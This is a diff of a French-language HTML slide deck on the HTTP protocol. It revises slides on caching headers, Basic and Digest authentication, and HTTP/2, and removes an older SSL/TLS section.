               <h2>Cache : Date et Expires</h2>
-<pre class="server">Date:Tue, 04 Sep 2012 09:24:26 GMT
+<pre class="server">Date: Tue, 04 Sep 2016 09:24:26 GMT
 Expires: Thu, 01 Dec 1994 16:00:00 GMT</pre>
               <ul>
                   <li><code>Date</code> obligatoire !
@@ -646,12 +758,13 @@ Expires: Thu, 01 Dec 1994 16:00:00 GMT</pre>
 <pre class="server">HTTP/1.1 200 OK
 Date: Mon, 03 Sep 2012 15:05:20 GMT
 Expires: Mon, 03 Sep 2012 15:05:20 GMT
-Last-Modified: Mon, 02 Apr 2012 02:13:37 GMT
+<strong>Last-Modified: Mon, 02 Apr 2012 02:13:37 GMT</strong>
 ...</pre>
+Second appel
 <pre class="client">GET /logo.png HTTP/1.1
-If-Modified-Since: Mon, 02 Apr 2012 02:13:37 GMT
+<strong>If-Modified-Since: Mon, 02 Apr 2012 02:13:37 GMT</strong>
 ...</pre>
-<pre class="server">HTTP/1.1 304 Not Modified
+<pre class="server"><strong>HTTP/1.1 304 Not Modified</strong>
 Date: Mon, 03 Sep 2012 15:07:07 GMT
 Expires: Mon, 03 Sep 2012 15:07:07 GMT
 ...</pre>
@@ -663,15 +776,14 @@ Expires: Mon, 03 Sep 2012 15:07:07 GMT
 <pre class="client">GET /logo.png HTTP/1.1
 ...</pre>
 <pre class="server">HTTP/1.1 200 OK
-Date: Mon, 03 Sep 2012 15:05:20 GMT
-ETag: "8eca4-205f-17b94c"
+<strong>ETag: "8eca4-205f-17b94c"</strong>
 ...</pre>
+Second appel
 <pre class="client">GET /logo.png HTTP/1.1
-If-None-Match "8eca4-205f-17b94c"
+<strong>If-None-Match "8eca4-205f-17b94c"</strong>
 ...</pre>
-<pre class="server">HTTP/1.1 304 Not Modified
-Date: Mon, 03 Sep 2012 15:07:07 GMT
-ETag: "8eca4-205f-17b94c"
+<pre class="server"><strong>HTTP/1.1 304 Not Modified
+ETag: "8eca4-205f-17b94c"</strong>
 ...</pre>
             </section>
           </div>
@@ -680,25 +792,25 @@ ETag: "8eca4-205f-17b94c"
               <h2>Cache : Vary</h2>
 <h3>Exemple sur la compression :</h3>
 <pre class="client">GET /file.js HTTP/1.1
-Accept-Encoding: gzip, deflate
+<strong>Accept-Encoding: gzip, deflate</strong>
 ...</pre>
 <pre class="server">HTTP/1.1 200 OK
-Content-Encoding:gzip
-Date:Thu, 06 Sep 2012 13:56:47 GMT
-Expires:Thu, 13 Sep 2012 13:56:47 GMT
-ETag:M0-0eb75f26
-Vary:Accept-Encoding
+Content-Encoding: gzip
+Date: Thu, 06 Sep 2012 13:56:47 GMT
+Expires: Thu, 13 Sep 2012 13:56:47 GMT
+ETag: M0-0eb75f26
+<strong>Vary:Accept-Encoding</strong>
 ...</pre>
 <h3>Exemple sur la négociation de contenu :</h3>
 <pre class="client">GET /shops/all/address HTTP/1.1
 Host: www.exemple.org
-Accept: application/json
-Accept-Language: fr-FR; q=1.0, en; q=0.5
+<strong>Accept: application/json
+Accept-Language: fr-FR; q=1.0, en; q=0.5</strong>
 ... </pre>
 <pre class="server">HTTP/1.1 200 OK
 Content-type: application/json; charset=utf-8
 Content-Language: en-US
-Vary: Accept,Accept-Language
+<strong>Vary: Accept,Accept-Language</strong>
  ...</pre>
             </section>
           </div>
@@ -708,11 +820,9 @@ Vary: Accept,Accept-Language
               <ul>
                   <li>Utilisez soit <code>Expires</code>, soit <code>Cache-Control: max-age</code>
                   <li>avec soit <code>Last-Modified</code>, soit <code>ETag</code> <small>pour permettre les requêtes conditionnelles</small>
-                  <li>Idéalement, cachez pour un mois ou un an <small>(mais pas plus !)</small> et utiliser l’url fingerprinting
-                  <li>SSL/TLS : <code>Cache control: public</code> <small>(sinon, pas de cache sous FF)</small>
-                  <li>Attention aux paramètres dans les URL (proxies)
-                  <li>Limitez les cookies aux ressources qui ont en besoin <small>(html)</small>
-                  <li>Rappel : ressources statiques sur un autre sous-domaine
+                  <li>Idéalement, cachez plusieurs mois <small>(mais pas plus d’un an)</small> et utiliser l’« url fingerprinting » <small>(version ou hash dans l’url)</small>
+                  <li>Limitez les cookies aux ressources qui ont en besoin <small>(html personalisé par client)</small>
+                  <li>Ressources statiques sur un autre sous-domaine ou CDN
                   <li>Attention de bien configurer <code>Vary</code> en fonction du <code>Content-Encoding</code>, <code>Content-Type</code> ou encore sur les champs <code>Accept</code> <small>(Négociation de contenu)</small>
               </ul>
               </section>
@@ -729,13 +839,13 @@ Vary: Accept,Accept-Language
 <pre class="client">GET /private/index.html HTTP/1.1
 Host: www.exemple.org
 ...</pre>
-<pre class="server">HTTP/1.1 401 Authorization Required
+<pre class="server"><strong>HTTP/1.1 401 Authorization Required
+WWW-Authenticate: Basic realm="Secure Area"</strong>
 Content-type: text/html
-WWW-Authenticate: Basic realm="Secure Area"
 ...</pre>
 <pre class="client">GET /private/index.html HTTP/1.1
 Host: www.exemple.org
-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==
+<strong>Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</strong>
 </pre>
 <h3>Encodage/décodage base 64</h3>
 <kbd>&gt; echo -n "Aladdin:open sesame" | base64 -
@@ -748,18 +858,16 @@ Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==
         <div class="slide" id="authentification-digest-slide">
             <section>
             <h2>Authenfication Digest</h2>
-<pre class="server">HTTP/1.1 401 Authorization Required
-Content-type: text/html
+<pre class="server"><strong>HTTP/1.1 401 Authorization Required
 WWW-Authenticate: Digest realm="testrealm@host.com",
 qop="auth, auth-int",
 nonce="dcd98b7102dd2f0e8b11d0f600bfb0c093",
-opaque="5ccc069c403ebaf9f0171e9517f40e41"
+opaque="5ccc069c403ebaf9f0171e9517f40e41"</strong>
+Content-type: text/html
 ...</pre>
 <pre class="server">GET /private/index.html HTTP/1.1
 Host: www.exemple.org
-GET /dir/index.html HTTP/1.0
-Host: localhost
-Authorization: Digest username="gpaul",
+<strong>Authorization: Digest username="paulgreg",
 realm="testrealm@host.com",
 nonce="dcd98b7102dd2f0e8b11d0f600bfb0c093",
 uri="/private/index.html",
@@ -767,161 +875,10 @@ qop=auth,
 nc=00000001,
 cnonce="0a4f113b",
 response="6629fae49393a05397450978507c4ef1",
-opaque="5ccc069c403ebaf9f0171e9517f40e41"
+opaque="5ccc069c403ebaf9f0171e9517f40e41"</strong>
 </pre>
         </section>
         </div>
-
-        <div class="slide" id="ssl-tls-title-slide">
-            <section class="middle">
-            <h2><abbr title="Secure Sockets Layer">SSL</abbr>/<abbr title="Transport Layer Security">TLS</abbr></h2>
-            </section>
-        </div>
-        <div class="slide" id="ssl-tls-main-slide">
-              <section>
-              <h2><abbr title="Secure Sockets Layer">SSL</abbr>/<abbr title="Transport Layer Security">TLS</abbr> : Introduction</h2>
-              <ul>
-                  <li>SSL 1.0 (jamais publique), 2.0 en 1995,  3.0 en 1996 (<a href="https://tools.ietf.org/html/rfc6101"><abbr title="Request for comment">RFC</abbr> 6101</a>),
-                  <li>TLS 1.0 en 1999 (<a href="https://tools.ietf.org/html/rfc2246">RFC 2246</a>)
-                  <li>TLS 1.1 en 2006 (<a href="https://tools.ietf.org/html/rfc4346">RFC 4346</a>)
-                  <li>TLS 1.2 en 2008 (<a href="https://tools.ietf.org/html/rfc5246">RFC 5246</a>)
-                  <li>Mise à jour sur TLS 1.2 en 2011 (<a href="https://tools.ietf.org/html/rfc6176">RFC 6176</a>)
-                  <li>TLS utilisé sur <abbr title="HyperText Transfert Protocol">HTTP</abbr>, <abbr title="File Transfert Protocol">FTP</abbr>, <abbr title="Simple Mail Transfert Protocol">SMTP</abbr>, <abbr title="Network News Transfert Protocol">NNTP</abbr> et <abbr title="eXtensible Messaging and Presence Protocol">XMPP</abbr>
-                  <li><abbr title="Hypertext Transfer Protocol Secure">HTTPS</abbr> sur le port 443
-              </ul>
-              <h3>5 principes</h3>
-              <ul>
-                  <li>l'authentification du serveur,
-                  <li>la confidentialité des données échangées,
-                  <li>l'intégrité des données échangées,
-                  <li>la spontanéité,
-                  <li>de manière optionnelle, l'authentification du <a href="http://pilif.github.com/2008/05/why-is-nobody-using-ssl-client-certificates/">client avec un certificat</a>,
-                  <li>la transparence (HTTP over TLS).
-              </ul>
-              </section>
-          </div>
-          <div class="slide" id="ssl-tls-pre-requisites-slide">
-            <section>
-            <h2>Quelques rappels cryptographiques</h2>
-            <ul>
-                <li>Chiffrement symétrique <small>(DES, 3DES, AES, BlowFish,...)</small>
-                <li>Chiffrement asymétrique <small>(RSA)</small>
-                <li>Fonction de hashage <small>(MD5, SHA1, SHA256,...)</small>
-                <li>Signature
-                <img style="float:right" src="imgs/ssl-ca.png">
-                <li>Certificats <small>(x509)</small>
-                <li>Autorité de certification
-                <li>Chaînes de confiance
-            </ul>
-<h3>Création d’une signature</h3>
-<pre>var hash = sha1(certificat.info)
-return encrypt(ca.privatekey, hash)</pre>
-<h3>Vérification d’une signature</h3>
-<pre>var hash = sha1(certificat.info)
-var uncryptedSignature = decrypt(ca.publickey, signature)
-return hash == uncryptedSignature</pre>
-            </section>
-          </div>
-          <div class="slide" id="ssl-tls-handshake-slide">
-              <style scoped>
-              #ssl-tls-handshake-slide ul li { list-style-type:none; }
-              </style>
-              <section>
-              <h2><abbr title="Secure Sockets Layer">SSL</abbr>/<abbr title="Transport Layer Security">TLS</abbr> : Handshake</h2>
-              <img src="imgs/ssl-sequence.png" alt="SSL/TLS handshake" />
-              <ul>
-                  <li><span style="color: blue;">1.</span> Client hello : chiffrements supportés ordonnés
-                  <li><span style="color: blue;">2.</span> Server hello : chiffrement utilisé et certificat
-                  <small>(le client vérifie le certificat et la chaîne de confiance)</small>
-                  <li><span style="color: red;">3.</span> Pré-clé chiffrée avec la clé publique du serveur
-                  <li><span>4.</span> Négociation terminée, calcul de la clé secrête symétrique
-                  <li><span style="color: green;">5.</span> Échanges HTTP chiffrés avec la clé symétrique
-              </ul>
-              </section>
-          </div>
-          <div class="slide" id="ssl-tls-algorithms-slide">
-            <style scoped>
-            #ssl-tls-algorithms-slide ul { column-count: 3; }
-            #ssl-tls-algorithms-slide ul li { font-size: 13px; }
-            </style>
-              <section>
-              <h2>Algorithmes d’encryption</h2>
-              <p>Version, chiffrement asymétrique, chiffrement symétrique, négociation des clés, signature</p>
-              <ul>
-                <li>SSL2-RC4-128-with-MD5
-                <li>SSL2-RC2-128-CBC-with-MD5
-                <li>SSL2-DES-168-EDE3-CBC-with-MD5
-                <li>SSL2-DES-56-CBC-with-MD5
-                <li>SSL2-RC4-128-EXPORT40-with-MD5
-                <li>SSL2-RC2-128-CBC-EXPORT40-with-MD5
-                <li>SSL3-FORTEZZA-DMS-with-FORTEZZA-CBC-SHA
-                <li>SSL3-FORTEZZA-DMS-with-RC4-128-SHA
-                <li>SSL3-RSA-with-RC4-128-MD5
-                <li>SSL3-RSA-with-3DES-EDE-CBC-SHA
-                <li>SSL3-RSA-with-DES-CBC-SHA
-                <li>SSL3-RSA-with-RC4-40-MD5
-                <li>SSL3-RSA-with-RC2-CBC-40-MD5
-                <li>SSL3-FORTEZZA-DMS-with-null-SHA
-                <li>SSL3-RSA-with-null-MD5
-                <li>SSL3-RSA-FIPS-with-3DES-EDE--CBC-SHA
-                <li>SSL3-RSA-FIPS-with-DES-CBC-SHA
-                <li>SSL3-DHE-RSA-with-3DES-EDE-CBC-SHA
-                <li>SSL3-DHE-DSS-with-3DES-EDE-CBC-SHA
-                <li>SSL3-DHE-RSA-with-DES-CBC-SHA
-                <li>SSL3-DHE-DSS-with-DES-CBC-SHA
-                <li>TLS-RSA-1024-with-RC4-56-SHA
-                <li>TLS-RSA-1024-with-DES-CBC-SHA
-                <li>TLS-RSA-with-RC4-128-MD5
-                <li>SSL_RSA_WITH_RC4_128_SHA or TLS_RSA_WITH_RC4_128_SHA
-                <li>TLS-RSA-with-3DES-EDE-CBC-SHA
-                <li>TLS-RSA-with-DES-CBC-SHA
-                <li>TLS-RSA-with-AES-256-CBC-SHA
-                <li>TLS-RSA-with-AES-128-CBC-SHA
-                <li>TLS-RSA-with-RC4-40-MD5
-                <li>TLS-RSA-with-RC2-CBC-40-MD5
-                <li>TLS-RSA-with-null-MD5
-                <li>TLS-DHE-RSA-with-AES-256-CBC-SHA
-                <li>TLS-DHE-RSA-with-AES-128-CBC-SHA
-                <li>TLS-DHE-DSS-with-AES-256-CBC-SHA
-                <li>TLS-DHE-DSS-with-AES-128-CBC-SHA
-                <li>TLS-DHE-DSS-with-RC4-128-SHA
-                <li>TLS-ECDH-ECDSA-with-RC4-128-SHA
-                <li>TLS-ECDH-RSA-with-RC4-128-SHA
-                <li>TLS-ECDHE-ECDSA-with-RC4-128-SHA
-                <li>TLS-ECDHE-RSA-with-RC4-128-SHA
-                <li>TLS-ECDH-ECDSA-with-3DES-EDE-CBC-SHA
-                <li>TLS-ECDH-RSA-with-3DES-EDE-CBC-SHA
-                <li>TLS-ECDHE-ECDSA-with-3DES-EDE-CBC-SHA
-                <li>TLS-ECDHE-RSA-with-3DES-EDE-CBC-SHA
-                <li>TLS-ECDH-ECDSA-with-AES-128-CBC-SHA
-                <li>TLS-ECDH-RSA-with-AES-128-CBC-SHA
-                <li>TLS-ECDHE-ECDSA-with-AES-128-CBC-SHA
-                <li>TLS-ECDHE-RSA-with-AES-128-CBC-SHA
-                <li>TLS-ECDH-ECDSA-with-AES-256-CBC-SHA
-                <li>TLS-ECDH-RSA-with-AES-256-CBC-SHA
-                <li>TLS-ECDHE-ECDSA-with-AES-256-CBC-SHA
-                <li>TLS-ECDHE-RSA-with-AES-256-CBC-SHA
-              </ul>
-              </section>
-          </div>
-          <div class="slide" id="ssl-tls-diffie-hellman-slide">
-              <section>
-              <h2><abbr title="Secure Sockets Layer">SSL</abbr>/<abbr title="Transport Layer Security">TLS</abbr> : Diffie-Hellman</h2>
-              <a href="http://vincent.bernat.im/en/blog/2011-ssl-perfect-forward-secrecy.html">SSL/TLS & Perfect Forward Secrecy</a>, <small>DHE-RSA-AES128-SHA, ECDHE-RSA-AES128-SHA</small>
-              <p class="center"><img src="imgs/diffie-Hellman_key_exchange.png" alt="Algorithme de Diffie Hellman" /></p>
-              </section>
-          </div>
-          <div class="slide" id="ssl-tls-security-slide">
-                <section>
-                <h2><abbr title="Secure Sockets Layer">SSL</abbr>/<abbr title="Transport Layer Security">TLS</abbr> : Securité</h2>
-                <h3><a href="http://dev.chromium.org/sts"><abbr title="HTTP Strict Transport Security">HSTS</abbr></a></h3>
-                <pre>Strict-Transport-Security: max-age=16070400; includeSubDomains</pre>
-                <h3>Attaques connues</h3>
-                <p>En 2011, Thai Duong et Juliano Rizzo démontrent <a href="http://vnhacker.blogspot.fr/2011/09/beast.html"><abbr title="Browser Exploit Against SSL/TLS">BEAST</abbr></a>, une attaque contre TLS/1.0.</p>
-                <p>En 2012, ils présentent <a href="imgs/spdy.png"><abbr title="Compression Ratio Info-leak Made Easy">CRIME</abbr></a>, se basant sur la compression : TLS et SPDY sont vulnérables.</p>
-                </section>
-            </div>
-
 
          <div class="slide" id="extension-title-slide">
              <section class="middle">
@@ -957,39 +914,37 @@ Content-Length: xxxx
               </section>
           </div>
 
-          <div class="slide" id="spdy-http2-title-slide">
+          <div class="slide" id="http2-title-slide">
               <section class="middle">
-              <h2>SPDY / HTTP 2.0</h2>
+              <h2>HTTP/2</h2>
               </section>
           </div>
-          <div class="slide" id="spdy-slide">
+
+          <div class="slide" id="h2-1-slide">
               <section>
-              <h2><abbr title="Speedy"><a href="https://sites.google.com/a/chromium.org/dev/spdy">SPDY</a></abbr></h2>
+              <h2>HTTP/2 (ou h2)</h2>
               <ul>
-                  <li>standard de facto, standardisation en cours <small>(<a href="https://tools.ietf.org/html/draft-mbelshe-httpbis-spdy-00">draft-mbelshe-httpbis-spdy-00</a>)</small>
-                  <li>implémenté dans Google Chrome (<small><a href="chrome://net-internals/#spdy">chrome://net-internals/#spdy</a></small>) et Firefox 11 (<small><a href="https://hacks.mozilla.org/2012/02/spdy-brings-responsive-and-scalable-transport-to-firefox-11/">annonce</a></small>), actif par défaut dans Firefox 13 (<small><code>network.http.spdy.enabled</code>, cf <a href="about:config">about:config</a></small>) et Amazon Silk,
-                  <li>utilisé sur presque tous les services Google, ainsi que twitter,
-                  <li><img src="imgs/spdy.png" alt="Speedy stack" style="float: right; margin: .5em;"/>
-                  ne remplace pas HTTP mais change la façon dont les données sont envoyées,
-                  <li>suppression des entêtes redondants (user-agent, accept, etc),
-                  <li>compression des entêtes,
-                  <li>multiplexage (plusieurs streams) au sein d’une requête TCP,
-                  <li><a href="https://en.wikipedia.org/wiki/HTTP_pipelining">HTTP Pipelining</a>,
-                  <li>priorise les ressources,
-                  <li>"push" des resources liées (images, css, js) avant que le navigateur ne les demande,
-                  <li>TLS/SSL obligatoire.
+                  <li>Google propose <abbr title="Speedy"><a href="https://tools.ietf.org/html/draft-mbelshe-httpbis-spdy-00">SPDY</a></abbr> vers 2010
+                  <li>création d’un groupe de travail (httpbis) par l’IETF
+                  <li>SPDY deviendra la base de HTTP/2, il sera publié en 2015 (<a href="https://tools.ietf.org/html/rfc7540">RFC7540</a>)
+                  <li>rétro-compatibilité complète
+                  <li>ne remplace pas HTTP mais optimise l’échange des données
+                  <li>multiplexage (plusieurs streams) au sein d’une seule requête TCP :
+                      <img src="imgs/h2-connections.png">
               </ul>
               </section>
           </div>
-          <div class="slide" id="http2-slide">
+
+          <div class="slide" id="h2-2-slide">
               <section>
-              <h2>HTTP 2.0</h2>
+              <h2>HTTP/2 (ou h2)</h2>
               <ul>
-                  <li>en cours de réflexion par le groupe <a href="https://tools.ietf.org/wg/httpbis/">Hypertext Transfer Protocol Bis</a> <small>(httpbis)</small>,
-                  <li>buts : multiplexage, compression des entête, pipelining,
-                  <li>rétro-compatibilité complète,
-                  <li>SPDY candidat pour HTTP/2.0,
-                  <li>Microsoft propose <a href="https://tools.ietf.org/html/draft-montenegro-httpbis-speed-mobility-01">HTTP Speed+Mobility</a> (basé sur SPDY).
+                  <li>suppression des entêtes identiques entre les requêtes d’une session (<code>user-agent</code>, <code>accept</code>, etc),
+                  <li>compression des entêtes via <a href="https://tools.ietf.org/html/rfc7541">HPACK</a> (conséquence : que du binaire),
+                  <li>le serveur peut ré-ordonner les réponses (priorité),
+                  <li>le serveur peut pousser des resources que le navigateur n’a pas demandé
+                  <li>TLS obligatoire
+                  <li>supporté par <a href="https://caniuse.com/#feat=http2">tous les navigateurs récents</a> <small>(même IE11)</small> et la <a href="https://github.com/http2/http2-spec/wiki/Implementations">majorité des serveurs</a> (Apache 2.4.17+, nginx 1.9.5+, Tomcat 8.5+)
               </ul>
               </section>
           </div>
@@ -998,12 +953,12 @@ Content-Length: xxxx
               <section>
               <h2>Outils et resources</h2>
               <ul>
-                  <li>telnet, curl, wget,
-                  <li><a href="http://livehttpheaders.mozdev.org/">Live HTTP Headers</a> ou <a href="https://addons.mozilla.org/en-US/firefox/addon/httpfox/">HttpFox</a> pour Firefox,
-                  <li><a href="http://httpie.org">HTTPie</a> : curl pour "humain",
-                  <li><a href="http://htty.github.com">htty</a> : une console http,
-                  <li><a href="http://viewdns.info/">http://viewdns.info/</a>, boite à outils en ligne,
-                  <li><a href="http://rsstodolist.appspot.com/?n=http&amp;l=100">http://rsstodolist.appspot.com/?name=http</a> : toutes les références.
+                  <li>telnet, curl, wget
+                  <li><a href="http://httpie.org">HTTPie</a> : curl pour "humain"
+                  <li><a href="http://htty.github.com">htty</a> : une console http
+                  <li><a href="https://www.youtube.com/watch?v=KL9MR721c4w">RetourAuxSources Les cookies HTTP (par H. Sablonnière)</a>
+                  <li><a href="https://http2.github.io/faq/">h2 FAQ</a>, <a href="https://http2.akamai.com/demo">h2 demo</a>, <a href="https://www.tunetheweb.com/blog/http-versus-https-versus-http2/">HTTP vs HTTPS vs H2</a>
+                  <li><a href="http://rsstodolist.appspot.com/?n=http&amp;l=100">http://rsstodolist.appspot.com/?name=http</a> : toutes les références
               </ul>
               </section>
           </div>
@@ -1013,15 +968,7 @@ Content-Length: xxxx
   </div> <!-- presentation -->
 
   <script src="js/slides.js"></script>
-  <!--[if lt IE 9]>
-  <script
-      src="http://ajax.googleapis.com/ajax/libs/chrome-frame/1/CFInstall.min.js">
-  </script>
-  <script>CFInstall.check({ mode: "overlay" });</script>
-  <![endif]-->
-  <script src="src/prettify/prettify.js" onload="prettyPrint();" defer></script>
   <script src="js/slides.js"></script>
-  <script src="js/cache.js"></script>
   <script src="js/prefixfree.min.js"></script>
   </body>
 </html>
